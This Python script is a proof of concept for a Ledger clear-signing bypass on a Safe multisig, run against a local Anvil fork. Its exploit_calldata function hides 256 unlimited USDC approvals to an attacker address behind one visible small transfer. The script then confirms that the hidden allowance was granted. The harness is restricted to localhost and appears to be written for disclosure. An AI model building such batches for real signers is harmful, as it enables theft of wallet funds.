#!/usr/bin/env python3
"""Relay the recorded LEDGER_CLEAR_SIGNING_BYPASS SafeTx signature through local Anvil."""

from __future__ import annotations

import argparse
import hashlib
import json
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from pathlib import Path
from typing import Any


FORK_BLOCK = 25_808_274
SENTINEL_OWNER = "0x0000000000000000000000000000000000000001"
SAFE_PROXY = "0x2FF6c23a7ac049FF062abfE26B0dCD47630a82d8"
BATCH_EXECUTOR = "0x2cc8475177918e8C4d840150b68815A4b6f0f5f3"
USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
ATTACKER = "0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF"
VISIBLE_RECIPIENT = "0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045"

BATCH_SELECTOR = bytes.fromhex("1a833ee3")
APPROVE_SELECTOR = bytes.fromhex("095ea7b3")
TRANSFER_SELECTOR = bytes.fromhex("a9059cbb")
ARRAY_SIZE = 257
HIDDEN_CALLS = 256
VISIBLE_AMOUNT = 10_000_000
FORK_TOKEN_BALANCE = 100_000_000
MAX_UINT256 = (1 << 256) - 1
APPROVAL_TOPIC = (
    "0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925"
)
TRANSFER_TOPIC = (
    "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef"
)
EXECUTION_SUCCESS_TOPIC = (
    "0x442e715f626346e8c54381002da614f62bee8d27386535b2521ec8540898556e"
)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--signature",
        type=Path,
        default=Path("test/fixtures/safe-eip712-signature.json"),
    )
    parser.add_argument("--rpc-url", default="http://127.0.0.1:8545")
    parser.add_argument("--output", type=Path, required=True)
    parser.add_argument("--expected-fork-block", type=int, default=FORK_BLOCK)
    return parser.parse_args()


class RpcClient:
    def __init__(self, url: str) -> None:
        parsed = urllib.parse.urlparse(url)
        if parsed.scheme != "http" or parsed.hostname not in {
            "127.0.0.1",
            "localhost",
            "::1",
        }:
            raise ValueError("RPC must be a local HTTP endpoint")
        self.url = url
        self.request_id = 0

    def call(self, method: str, params: list[Any] | None = None) -> Any:
        self.request_id += 1
        body = json.dumps(
            {
                "jsonrpc": "2.0",
                "id": self.request_id,
                "method": method,
                "params": params or [],
            }
        ).encode()
        request = urllib.request.Request(
            self.url,
            data=body,
            headers={"Content-Type": "application/json"},
        )
        try:
            with urllib.request.urlopen(request, timeout=30) as response:
                result = json.loads(response.read())
        except urllib.error.URLError as error:
            raise RuntimeError(f"Local RPC request failed: {error}") from error
        if "error" in result:
            raise RuntimeError(f"RPC {method} failed: {result['error']}")
        return result["result"]


def word(value: int) -> str:
    return f"{value:064x}"


def address_word(address: str) -> str:
    raw = address.removeprefix("0x")
    if len(raw) != 40:
        raise ValueError(f"Invalid address: {address}")
    return raw.rjust(64, "0")


def pad_address(address: str) -> bytes:
    return bytes.fromhex(address.removeprefix("0x")).rjust(32, b"\x00")


def uint256(value: int) -> bytes:
    return value.to_bytes(32, "big")


def right_pad_word(value: bytes) -> bytes:
    return value + b"\x00" * ((-len(value)) % 32)


def encode_call(target: str, calldata: bytes) -> bytes:
    return b"".join(
        (
            pad_address(target),
            uint256(0),
            uint256(0x60),
            uint256(len(calldata)),
            right_pad_word(calldata),
        )
    )


def exploit_calldata() -> bytes:
    approve = APPROVE_SELECTOR + pad_address(ATTACKER) + b"\xff" * 32
    transfer = (
        TRANSFER_SELECTOR
        + pad_address(VISIBLE_RECIPIENT)
        + uint256(VISIBLE_AMOUNT)
    )
    malicious_tuple = encode_call(USDC, approve)
    visible_tuple = encode_call(USDC, transfer)
    malicious_offset = ARRAY_SIZE * 32
    visible_offset = malicious_offset + len(malicious_tuple)
    offsets = uint256(malicious_offset) * HIDDEN_CALLS + uint256(visible_offset)
    return b"".join(
        (
            BATCH_SELECTOR,
            uint256(0x20),
            uint256(ARRAY_SIZE),
            offsets,
            malicious_tuple,
            visible_tuple,
        )
    )


def cast_calldata(signature: str, *args: str | int) -> str:
    result = subprocess.run(
        ["cast", "calldata", signature, *(str(arg) for arg in args)],
        check=True,
        capture_output=True,
        text=True,
    )
    return result.stdout.strip()


def uint_call(rpc: RpcClient, target: str, data: str) -> int:
    return int(rpc.call("eth_call", [{"to": target, "data": data}, "latest"]), 16)


def token_balance(rpc: RpcClient, account: str) -> int:
    return uint_call(rpc, USDC, "0x70a08231" + address_word(account))


def token_allowance(rpc: RpcClient, owner: str, spender: str) -> int:
    return uint_call(
        rpc,
        USDC,
        "0xdd62ed3e" + address_word(owner) + address_word(spender),
    )


def topic_address(address: str) -> str:
    return "0x" + address_word(address)


def matching_logs(
    receipt: dict[str, Any],
    emitter: str,
    topic0: str,
    indexed_topics: list[str],
    data: int,
) -> list[dict[str, Any]]:
    expected_topics = [topic0, *indexed_topics]
    return [
        log
        for log in receipt["logs"]
        if log["address"].lower() == emitter.lower()
        and [topic.lower() for topic in log["topics"]] == [
            topic.lower() for topic in expected_topics
        ]
        and int(log["data"], 16) == data
    ]


def get_owners(rpc: RpcClient) -> list[str]:
    response = rpc.call(
        "eth_call", [{"to": SAFE_PROXY, "data": "0xa0e67e2b"}, "latest"]
    )
    encoded = bytes.fromhex(response[2:])
    if len(encoded) < 64:
        raise RuntimeError("Safe getOwners returned malformed data")
    offset = int.from_bytes(encoded[:32], "big")
    count = int.from_bytes(encoded[offset : offset + 32], "big")
    start = offset + 32
    end = start + count * 32
    if end > len(encoded):
        raise RuntimeError("Safe getOwners returned a truncated array")
    return [
        "0x" + encoded[start + i * 32 + 12 : start + (i + 1) * 32].hex()
        for i in range(count)
    ]


def wait_for_receipt(rpc: RpcClient, tx_hash: str) -> dict[str, Any]:
    for _ in range(120):
        receipt = rpc.call("eth_getTransactionReceipt", [tx_hash])
        if receipt is not None:
            if int(receipt["status"], 16) != 1:
                raise RuntimeError(f"Transaction reverted: {tx_hash}")
            return receipt
        time.sleep(0.1)
    raise TimeoutError(f"Timed out waiting for transaction {tx_hash}")


def send_unlocked(
    rpc: RpcClient, sender: str, target: str, data: str, gas: int
) -> tuple[str, dict[str, Any]]:
    tx_hash = rpc.call(
        "eth_sendTransaction",
        [{"from": sender, "to": target, "gas": hex(gas), "data": data}],
    )
    return tx_hash, wait_for_receipt(rpc, tx_hash)


def mapping_slot(account: str, slot: int) -> str:
    encoded = "0x" + address_word(account) + word(slot)
    result = subprocess.run(
        ["cast", "keccak", encoded],
        check=True,
        capture_output=True,
        text=True,
    )
    return result.stdout.strip()


def fund_safe_with_usdc(rpc: RpcClient) -> int:
    value = "0x" + word(FORK_TOKEN_BALANCE)
    for slot in range(100):
        location = mapping_slot(SAFE_PROXY, slot)
        previous = rpc.call("eth_getStorageAt", [USDC, location, "latest"])
        rpc.call("anvil_setStorageAt", [USDC, location, value])
        if token_balance(rpc, SAFE_PROXY) == FORK_TOKEN_BALANCE:
            return slot
        rpc.call("anvil_setStorageAt", [USDC, location, previous])
    raise RuntimeError("Could not locate USDC balance storage in the fork")


def configure_safe(rpc: RpcClient, signer: str) -> tuple[str, int]:
    owners = get_owners(rpc)
    if not owners:
        raise RuntimeError("Fork Safe has no owners")

    rpc.call("anvil_setBalance", [SAFE_PROXY, hex(10**20)])
    rpc.call("anvil_impersonateAccount", [SAFE_PROXY])
    try:
        swap_owner = (
            "0xe318b52b"
            + address_word(SENTINEL_OWNER)
            + address_word(owners[0])
            + address_word(signer)
        )
        send_unlocked(rpc, SAFE_PROXY, SAFE_PROXY, swap_owner, 200_000)
        send_unlocked(
            rpc,
            SAFE_PROXY,
            SAFE_PROXY,
            "0x694e80c3" + word(1),
            100_000,
        )
    finally:
        rpc.call("anvil_stopImpersonatingAccount", [SAFE_PROXY])

    threshold = uint_call(rpc, SAFE_PROXY, "0xe75235b8")
    if threshold != 1:
        raise RuntimeError("Fork Safe threshold setup failed")
    return owners[0], threshold


def choose_relayer(accounts: list[str], signer: str) -> str:
    for account in accounts:
        if account.lower() != signer.lower():
            return account
    raise RuntimeError("Anvil did not expose an account distinct from the signer")


def main() -> None:
    args = parse_args()
    executor_path = Path(__file__)
    executor_label = Path("poc") / executor_path.name
    executor_bytes = executor_path.read_bytes()
    fixture_bytes = args.signature.read_bytes()
    fixture = json.loads(fixture_bytes)
    rpc = RpcClient(args.rpc_url)

    client_version = rpc.call("web3_clientVersion")
    if "anvil" not in client_version.lower():
        raise RuntimeError(f"Refusing non-Anvil RPC: {client_version}")
    chain_id = int(rpc.call("eth_chainId"), 16)
    if chain_id != 1:
        raise RuntimeError(f"Expected Ethereum chain ID 1, got {chain_id}")
    fork_head_before_setup = int(rpc.call("eth_blockNumber"), 16)
    if fork_head_before_setup != args.expected_fork_block:
        raise RuntimeError(
            f"Expected fork block {args.expected_fork_block}, got {fork_head_before_setup}"
        )

    signer = fixture["signer"]
    signature = fixture["signature"]["safe_signature_hex"]
    expected_safe_tx_hash = fixture["safe_tx_hash"]
    signed_nonce = int(fixture["nonce"])
    relayer = choose_relayer(rpc.call("eth_accounts"), signer)

    replaced_owner, threshold = configure_safe(rpc, signer)
    token_slot = fund_safe_with_usdc(rpc)

    batch = exploit_calldata()
    if len(batch) != 8_740:
        raise RuntimeError(f"Unexpected exploit calldata length: {len(batch)}")
    batch_hex = "0x" + batch.hex()
    safe_nonce_before = uint_call(rpc, SAFE_PROXY, "0xaffed0e0")
    if safe_nonce_before != signed_nonce:
        raise RuntimeError(
            f"Safe nonce {safe_nonce_before} does not match signed nonce {signed_nonce}"
        )

    hash_calldata = cast_calldata(
        "getTransactionHash(address,uint256,bytes,uint8,uint256,uint256,uint256,address,address,uint256)",
        BATCH_EXECUTOR,
        0,
        batch_hex,
        1,
        0,
        0,
        0,
        "0x0000000000000000000000000000000000000000",
        "0x0000000000000000000000000000000000000000",
        signed_nonce,
    )
    computed_safe_tx_hash = rpc.call(
        "eth_call", [{"to": SAFE_PROXY, "data": hash_calldata}, "latest"]
    )
    if computed_safe_tx_hash.lower() != expected_safe_tx_hash.lower():
        raise RuntimeError(
            "Anvil Safe hash does not match the recorded Ledger signature"
        )

    safe_balance_before = token_balance(rpc, SAFE_PROXY)
    recipient_before = token_balance(rpc, VISIBLE_RECIPIENT)
    allowance_before = token_allowance(rpc, SAFE_PROXY, ATTACKER)

    execution_calldata = cast_calldata(
        "execTransaction(address,uint256,bytes,uint8,uint256,uint256,uint256,address,address,bytes)",
        BATCH_EXECUTOR,
        0,
        batch_hex,
        1,
        0,
        0,
        0,
        "0x0000000000000000000000000000000000000000",
        "0x0000000000000000000000000000000000000000",
        signature,
    )
    tx_hash, receipt = send_unlocked(
        rpc, relayer, SAFE_PROXY, execution_calldata, 12_000_000
    )
    outer_transaction = rpc.call("eth_getTransactionByHash", [tx_hash])

    approval_logs = matching_logs(
        receipt,
        USDC,
        APPROVAL_TOPIC,
        [topic_address(SAFE_PROXY), topic_address(ATTACKER)],
        MAX_UINT256,
    )
    transfer_logs = matching_logs(
        receipt,
        USDC,
        TRANSFER_TOPIC,
        [topic_address(SAFE_PROXY), topic_address(VISIBLE_RECIPIENT)],
        VISIBLE_AMOUNT,
    )
    execution_logs = matching_logs(
        receipt,
        SAFE_PROXY,
        EXECUTION_SUCCESS_TOPIC,
        [expected_safe_tx_hash],
        0,
    )

    safe_nonce_after = uint_call(rpc, SAFE_PROXY, "0xaffed0e0")
    safe_balance_after = token_balance(rpc, SAFE_PROXY)
    recipient_after = token_balance(rpc, VISIBLE_RECIPIENT)
    allowance_after = token_allowance(rpc, SAFE_PROXY, ATTACKER)
    assertions = {
        "safe_hash_matches_ledger_signature": (
            computed_safe_tx_hash.lower() == expected_safe_tx_hash.lower()
        ),
        "relayer_is_not_ledger_signer": relayer.lower() != signer.lower(),
        "outer_transaction_from_relayer": (
            outer_transaction["from"].lower() == relayer.lower()
        ),
        "all_hidden_approval_events_emitted": len(approval_logs) == HIDDEN_CALLS,
        "visible_transfer_event_emitted": len(transfer_logs) == 1,
        "safe_execution_success_event_emitted": len(execution_logs) == 1,
        "receipt_contains_only_expected_events": (
            len(receipt["logs"]) == HIDDEN_CALLS + 2
        ),
        "safe_nonce_advanced": safe_nonce_after == safe_nonce_before + 1,
        "safe_balance_decreased_by_visible_amount": (
            safe_balance_after == safe_balance_before - VISIBLE_AMOUNT
        ),
        "recipient_received_visible_amount": (
            recipient_after == recipient_before + VISIBLE_AMOUNT
        ),
        "hidden_max_allowance_set": allowance_after == MAX_UINT256,
    }
    failed = [name for name, passed in assertions.items() if not passed]
    if failed:
        raise RuntimeError(f"Safe execution assertions failed: {', '.join(failed)}")

    output = {
        "schema": "ledger-clear-signing-bypass-safe-eip712-anvil-execution/v1",
        "executed_at_utc": datetime.now(timezone.utc).isoformat(),
        "rpc": {
            "url": args.rpc_url,
            "client_version": client_version,
            "chain_id": chain_id,
            "fork_head_before_setup": fork_head_before_setup,
        },
        "inputs": {
            "executor": str(executor_label),
            "executor_sha256": hashlib.sha256(executor_bytes).hexdigest(),
            "signature_fixture": str(args.signature),
            "signature_fixture_sha256": hashlib.sha256(fixture_bytes).hexdigest(),
            "batch_calldata_length": len(batch),
            "batch_calldata_sha256": hashlib.sha256(batch).hexdigest(),
            "recorded_safe_tx_hash": expected_safe_tx_hash,
            "computed_safe_tx_hash": computed_safe_tx_hash,
            "ledger_signer": signer,
            "relayer": relayer,
        },
        "fork_setup": {
            "safe_proxy": SAFE_PROXY,
            "replaced_owner": replaced_owner,
            "effective_owner": signer,
            "threshold": threshold,
            "usdc_balance_slot": token_slot,
        },
        "outer_transaction": {
            "hash": tx_hash,
            "from": outer_transaction["from"],
            "to": outer_transaction["to"],
            "input_sha256": hashlib.sha256(
                bytes.fromhex(execution_calldata.removeprefix("0x"))
            ).hexdigest(),
            "block_number": int(receipt["blockNumber"], 16),
            "gas_used": int(receipt["gasUsed"], 16),
        },
        "receipt_evidence": {
            "status": int(receipt["status"], 16),
            "block_hash": receipt["blockHash"],
            "logs_bloom": receipt["logsBloom"],
            "hidden_approval_events": len(approval_logs),
            "visible_transfer_events": len(transfer_logs),
            "safe_execution_success_events": len(execution_logs),
            "total_events": len(receipt["logs"]),
        },
        "state": {
            "safe_nonce": {"before": safe_nonce_before, "after": safe_nonce_after},
            "safe_usdc": {"before": safe_balance_before, "after": safe_balance_after},
            "recipient_usdc": {"before": recipient_before, "after": recipient_after},
            "attacker_allowance": {"before": allowance_before, "after": allowance_after},
        },
        "assertions": assertions,
    }
    args.output.parent.mkdir(parents=True, exist_ok=True)
    args.output.write_text(json.dumps(output, indent=2) + "\n", encoding="utf-8")

    print(f"ledger signer: {signer}")
    print(f"relayer: {relayer}")
    print(f"safe tx hash: {computed_safe_tx_hash}")
    print(f"outer transaction: {tx_hash}")
    print(f"gas used: {output['outer_transaction']['gas_used']}")
    for name in assertions:
        print(f"assertion {name}: passed")
    print(f"transcript: {args.output}")


if __name__ == "__main__":
    main()
